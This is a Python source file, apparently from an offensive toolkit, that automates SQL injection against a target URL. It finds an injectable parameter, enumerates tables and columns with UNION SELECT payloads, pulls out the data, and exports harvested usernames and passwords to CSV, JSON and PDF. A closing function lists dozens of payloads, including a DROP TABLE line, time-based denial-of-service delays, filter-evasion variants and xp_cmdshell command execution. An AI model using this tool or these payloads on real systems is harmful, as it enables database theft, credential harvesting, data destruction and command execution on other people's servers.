import requests
import logging
import re
from threading import Lock

# Import export functions from export.py
from src.core.utils.export import export_sql_to_csv, export_sql_to_json, export_sql_to_pdf

# Logger configuration
logging.basicConfig(
    filename="sql_injection.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)


class SQLInjection:
    def __init__(self, url, callback=None, timeout=5):
        """
        Initializes the SQLInjection class.

        :param url: Target URL for the SQL Injection attack.
        :param callback: Callback function to update the graphical interface.
        :param timeout: Timeout for HTTP requests.
        """
        self.url = url
        self.callback = callback
        self.timeout = timeout
        self.credentials = []
        self.tables = []
        self.columns = {}
        self.data = {}
        self.running = True
        self.lock = Lock()

    def send_request(self, payload, method="POST", headers=None, cookies=None):
        """
        Sends an HTTP request with the SQL Injection payload.

        :param payload: Payload to inject in the request.
        :param method: HTTP method to use (GET or POST).
        :param headers: Custom headers for the request.
        :param cookies: Cookies to include in the request.
        :return: Text response of the HTTP request.
        """
        try:
            if not self.validate_url(self.url):
                raise ValueError("Invalid or malformed URL.")

            headers = headers or {}
            cookies = cookies or {}
            params = {"id": payload} if method == "GET" else None
            data = {"id": payload} if method == "POST" else None

            response = requests.request(
                method=method,
                url=self.url,
                params=params,
                data=data,
                headers=headers,
                cookies=cookies,
                timeout=self.timeout
            )
            response.raise_for_status()
            return response.text
        except requests.exceptions.Timeout:
            logging.error("Request timed out.")
            self.log_message("[ERROR] Request timed out.")
        except requests.exceptions.ConnectionError:
            logging.error("Connection error to the server.")
            self.log_message("[ERROR] Connection error.")
        except requests.exceptions.RequestException as e:
            logging.error(f"Unknown error while sending request: {e}")
            self.log_message(f"[ERROR] Unknown error: {e}")
        except ValueError as e:
            logging.error(f"Validation failed: {e}")
            self.log_message(f"[ERROR] {e}")
        return ""

    def validate_url(self, url):
        """Validates that the URL is well-formed."""
        pattern = r"^(http|https)://[\S]+$"
        return re.match(pattern, url) is not None

    def log_message(self, message):
        """
        Sends a message to the results TextBox in the graphical interface.

        :param message: Message to send.
        """
        if self.callback:
            with self.lock:
                self.callback(message)
        logging.info(message)

    def start(self):
        """
        Starts the SQL Injection attack.
        """
        try:
            self.log_message("[INFO] Starting SQL Injection attack...")
            vulnerable_param = self.detect_vulnerable_params()
            if not vulnerable_param:
                self.log_message("[WARNING] No vulnerable parameters detected automatically.")
                return
            self.enumerate_tables(vulnerable_param)
            self.enumerate_columns(vulnerable_param)
            self.extract_data(vulnerable_param)
            self.log_message("[INFO] SQL Injection attack completed.")
            self.save_results()
        except Exception as e:
            logging.error(f"Error during attack: {e}")
            self.log_message(f"[ERROR] Error during attack: {e}")

    def stop(self):
        """
        Stops the SQL Injection attack.
        """
        self.running = False
        self.log_message("[INFO] SQL Injection attack stopped.")

    def detect_vulnerable_params(self):
        """
        Detects vulnerable parameters in the target URL.
        """
        self.log_message("[INFO] Detecting vulnerable parameters...")
        params = ["id", "user", "name", "query"]
        for param in params:
            payload = "' OR '1'='1 --"
            response = self.send_request(payload, method="GET", headers={"test-param": param})
            if "SQL syntax" in response or "error" in response.lower():
                self.log_message(f"[INFO] Vulnerable parameter detected: {param}")
                return param
        return None

    def enumerate_tables(self, param):
        """
        Enumerates all tables in the database.
        """
        self.log_message("[INFO] Enumerating tables...")
        payload = "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --"
        response = self.send_request(payload)
        tables = re.findall(r"<table>(.*?)</table>", response, re.DOTALL)
        if tables:
            self.tables = [table.strip() for table in tables]
            self.log_message(f"[INFO] Tables found: {', '.join(self.tables)}")
        else:
            self.log_message("[WARNING] No tables found or payload did not work.")

    def enumerate_columns(self, param):
        """
        Enumerates all columns for each discovered table.
        """
        self.log_message("[INFO] Enumerating columns for each table...")
        for table in self.tables:
            if not self.running:
                break
            payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{table}' --"
            response = self.send_request(payload)
            columns = re.findall(r"<table>(.*?)</table>", response, re.DOTALL)
            if columns:
                cols = [col.strip() for col in columns]
                self.columns[table] = cols
                self.log_message(f"[INFO] Columns in '{table}': {', '.join(cols)}")
            else:
                self.log_message(f"[WARNING] No columns found for table '{table}' or payload did not work.")

    def extract_data(self, param):
        """
        Extracts data from the columns found in each table.
        """
        self.log_message("[INFO] Extracting data from tables and columns...")
        for table, cols in self.columns.items():
            if not self.running:
                break
            for col in cols:
                if not self.running:
                    break
                payload = f"' UNION SELECT {col}, NULL FROM {table} --"
                response = self.send_request(payload)
                data = re.findall(r"<table>(.*?)</table>", response, re.DOTALL)
                if data:
                    extracted_data = [d.strip() for d in data]
                    if table not in self.data:
                        self.data[table] = {}
                    if col not in self.data[table]:
                        self.data[table][col] = []
                    self.data[table][col].extend(extracted_data)
                    self.log_message(f"[INFO] Data extracted from '{table}.{col}': {', '.join(extracted_data)}")
                else:
                    self.log_message(f"[WARNING] No data extracted from '{table}.{col}' or payload did not work.")

    def save_results(self):
        """
        Saves the extracted results using the export functions.
        """
        if 'users' in self.data:
            for i, entry in enumerate(self.data['users'].get('username', [])):
                password = self.data['users']['password'][i] if 'password' in self.data['users'] and len(self.data['users']['password']) > i else 'N/A'
                self.credentials.append({"username": entry, "password": password})
            export_sql_to_csv("sql_results.csv", self.credentials)
            export_sql_to_json("sql_results.json", self.credentials)
            export_sql_to_pdf("sql_results.pdf", self.credentials)
        else:
            self.log_message("[WARNING] No credentials found in the 'users' table.")


def get_sql_injection_commands():
    """Returns an extended list of common SQL Injection commands/payloads."""
    return [
        # Basic
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 /*",
        "'; DROP TABLE users; --",
        
        # UNION SELECT injections
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --",
        "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT CONCAT(username, ':', password), NULL FROM users --",
        "' UNION ALL SELECT NULL, NULL, @@version --",
        "' UNION ALL SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database() --",
        "' UNION SELECT 1, version(), user() --",

        # Delays and DoS
        "'; WAITFOR DELAY '0:0:5' --",
        "'; SLEEP(5) --",
        "' AND IF(1=1, SLEEP(5), 0) --",
        "' AND 1=BENCHMARK(5000000,MD5(1)) --",
        "' OR SLEEP(5) --",
        "' OR IF(1=1, SLEEP(5), 0) --",
        "' OR IF(1=2, SLEEP(5), 0) --",

        # Filter evasion
        "' UNION SELECT /*!32302 1,2,3*/ --",
        "' /*!50000SELECT*/ * FROM users --",
        "' OR HEX('a')=HEX('a') --",
        "' OR ASCII('a')=97 --",
        "' UNION /*!40101 SELECT*/ 1,2,3 --",
        "' OR 1=1; EXEC xp_cmdshell('whoami') --",
        "'/**/OR/**/1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' OR 1=1#",
        "' OR 1=1;--",
        "'; EXEC('xp_cmdshell ''whoami''') --",
        "'/**/OR/**/1=1/**/--",
        "' /*!50000UNION*/ SELECT NULL,NULL,NULL --",

        # Attacks on system functions
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
        "' UNION SELECT 1, @@hostname, @@datadir --",
        "' AND (SELECT 1 FROM dual WHERE database() LIKE '%test%') --",
        "' UNION SELECT user(),database(),version() --",
        "' AND (SELECT COUNT(*) FROM mysql.user)>0 --",

        # Database-specific payloads
        "' OR PG_SLEEP(5)--",  # PostgreSQL
        "'; EXEC sp_who;--",  # SQL Server
        "' AND SQLITE_VERSION()='3.31.1' --",  # SQLite
        "'; SELECT user FROM dual --",  # Oracle
        "' AND password LIKE CHAR(37,37,37) --",  # MySQL specific
    ]
